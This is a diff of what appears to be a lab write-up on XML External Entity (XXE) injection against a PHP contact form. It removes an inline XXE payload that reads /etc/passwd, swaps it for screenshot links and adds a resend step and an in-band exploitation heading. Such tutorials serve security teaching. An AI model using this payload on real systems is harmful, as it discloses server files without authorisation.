@@ -76,15 +76,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
 <p>Since the application returns the value of the name parameter, we can inject an entity that is pointing to /etc/passwd to disclose its values.</p>
 
-<pre><code><!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<contact>
-<name>&xxe;</name>
-<email>test@test.com</email>
-<message>test</message>
-</contact>
-</code></pre>
+![image](https://github.com/user-attachments/assets/0f156bea-9ebe-4a25-8926-eb6075397055)
+
+<p>Using the payload above, replace the initial XML data submitted to contact_submit.php and resend the request.</p>
+
+![image](https://github.com/user-attachments/assets/58e81427-a150-4b62-aff9-4fcc34890026)
+
+
+<h3>In-Band XXE Exploitation</h3>
+
+
 
 ![image](https://github.com/user-attachments/assets/53e2b635-6567-43c9-b046-819959d5d8b2)
 
